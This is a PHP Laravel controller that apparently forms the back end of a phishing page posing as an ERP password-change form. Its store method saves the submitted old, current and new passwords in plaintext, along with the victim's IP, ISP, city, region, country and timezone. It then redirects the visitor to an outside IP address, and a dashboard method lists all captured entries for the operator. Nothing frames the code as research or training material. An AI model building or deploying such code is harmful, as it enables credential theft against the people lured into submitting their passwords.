<?php

namespace App\Http\Controllers;

use App\Models\erp;
use Illuminate\Http\Request;

class ErpController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
                /**
         * Get the ip address from the user
         */
        function getUserIpAddr(){
            if(!empty($_SERVER['HTTP_CLIENT_IP'])){
                //ip from share internet
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
                //ip pass from proxy
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            }else{
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            return $ip;
        }

        $getIpAddress = getUserIpAddr();
        return view('erp.index', compact('getIpAddress'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $dataErp = new erp();

        $this->validate($request, [
            'old_password' => 'required',
            'password' => 'required',
            'new_password' => 'required',
        ]);

        $dataErp->old_password = $request->old_password;
        $dataErp->password = $request->password;
        $dataErp->new_password = $request->new_password;
        $dataErp->ip = $request->ip;
        $dataErp->isp = $request->isp;
        $dataErp->city = $request->city;
        $dataErp->region = $request->region;
        $dataErp->country = $request->country;
        $dataErp->timezone = $request->timezone;
        
        $dataErp->save();

        return redirect('http://112.196.7.100/');
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\erp  $erp
     * @return \Illuminate\Http\Response
     */
    public function show(erp $erp)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\erp  $erp
     * @return \Illuminate\Http\Response
     */
    public function edit(erp $erp)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\erp  $erp
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, erp $erp)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\erp  $erp
     * @return \Illuminate\Http\Response
     */
    public function destroy(erp $erp)
    {
        //
    }

    public function dashboardErp()
    {
        $dataErp = erp::orderBy('id', 'DESC')->paginate();
        //dd($dataErp);
        return view('erp.dashboard', compact('dataErp'));
    }
}
